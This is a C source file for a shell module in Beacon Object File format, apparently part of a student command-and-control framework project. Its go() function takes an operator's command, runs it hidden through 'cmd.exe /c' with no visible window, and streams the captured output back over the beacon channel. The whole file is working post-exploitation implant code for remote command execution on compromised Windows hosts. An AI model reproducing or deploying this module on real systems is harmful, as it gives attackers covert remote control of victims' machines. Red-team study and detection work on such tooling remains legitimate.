/*
 * ============================================================
 *  modules/bof/mod_shell.c — Module shell au format BOF
 *
 *  Exécute une commande shell et retourne sa sortie complète.
 *  Utilise CreatePipe + CreateProcess pour capturer stdout/stderr.
 *
 *  Compilation BOF :
 *    x86_64-w64-mingw32-gcc -c -DBOF_MODE -o shell.x64.o mod_shell.c
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "beacon.h"

/* ── Déclarations Windows API (BOF mode uniquement) ──────────
 * En RDLL mode, windows.h fournit déjà ces déclarations.     */
#ifndef RDLL_MODE
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
#endif /* !RDLL_MODE */

#ifndef HANDLE_FLAG_INHERIT
#  define HANDLE_FLAG_INHERIT   0x00000001
#endif
#ifndef CREATE_NO_WINDOW
#  define CREATE_NO_WINDOW      0x08000000
#endif
#define INFINITE_WAIT           0xFFFFFFFF  /* distinct de INFINITE */

/* ── Fonction d'entrée BOF ────────────────────────────────── */

void go(char *args, int args_len) {
    datap  parser;
    char  *command = NULL;
    int    cmd_len = 0;

    /* Extraire la commande depuis les arguments packés */
    BeaconDataParse(&parser, args, args_len);
    command = BeaconDataExtract(&parser, &cmd_len);

    if (!command || cmd_len == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Aucune commande fournie\n");
        return;
    }

    /* Construire "cmd.exe /c <commande>" */
    char cmd_line[4096] = {0};
    __builtin_memcpy(cmd_line, "cmd.exe /c ", 11);
    int remain = (int)sizeof(cmd_line) - 12;
    int copy   = cmd_len < remain ? cmd_len : remain;
    __builtin_memcpy(cmd_line + 11, command, (size_t)copy);

    /* Créer le pipe pour capturer la sortie */
    HANDLE hRead = NULL, hWrite = NULL;

    /* SECURITY_ATTRIBUTES pour que le handle soit héritable */
    struct { DWORD nLength; void *lpSecurityDescriptor; BOOL bInheritHandle; } sa;
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;

    if (!KERNEL32$CreatePipe(&hRead, &hWrite, (LPSECURITY_ATTRIBUTES)&sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] CreatePipe échoué\n");
        return;
    }

    /* Le handle de lecture ne doit PAS être hérité par le processus enfant */
    KERNEL32$SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    /* Configurer STARTUPINFO pour rediriger stdout/stderr */
    struct {
        DWORD  cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle;
        DWORD  dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize;
        DWORD  dwXCountChars; DWORD dwYCountChars;
        DWORD  dwFillAttribute; DWORD dwFlags;
        WORD   wShowWindow; WORD cbReserved2; LPBYTE lpReserved2;
        HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;
    } si;
    __builtin_memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = 0x00000100 /* STARTF_USESTDHANDLES */;
    si.hStdInput   = NULL;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;

    /* PROCESS_INFORMATION */
    struct { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } pi;
    __builtin_memset(&pi, 0, sizeof(pi));

    BOOL ok = KERNEL32$CreateProcessA(
        NULL, cmd_line, NULL, NULL,
        TRUE,                   /* bInheritHandles */
        CREATE_NO_WINDOW,       /* pas de fenêtre visible */
        NULL, NULL,
        (LPSTARTUPINFOA)&si,
        (LPPROCESS_INFORMATION)&pi
    );

    /* Fermer le handle d'écriture dans le processus parent.
     * Sinon ReadFile ne retourne jamais EOF.               */
    KERNEL32$CloseHandle(hWrite);

    if (!ok) {
        KERNEL32$CloseHandle(hRead);
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] CreateProcess échoué\n");
        return;
    }

    /* Lire la sortie par chunks de 4 KB */
    char   buf[4096];
    DWORD  bytes_read = 0;

    while (KERNEL32$ReadFile(hRead, buf, sizeof(buf) - 1, &bytes_read, NULL)
           && bytes_read > 0) {
        buf[bytes_read] = '\0';
        BeaconOutput(CALLBACK_OUTPUT, buf, (int)bytes_read);
    }

    /* Attendre la fin du processus et récupérer le code de retour */
    KERNEL32$WaitForSingleObject(pi.hProcess, INFINITE_WAIT);

    DWORD exit_code = 0;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exit_code);
    if (exit_code != 0)
        BeaconPrintf(CALLBACK_OUTPUT, "\n[code: %lu]\n", (unsigned long)exit_code);

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(hRead);
}
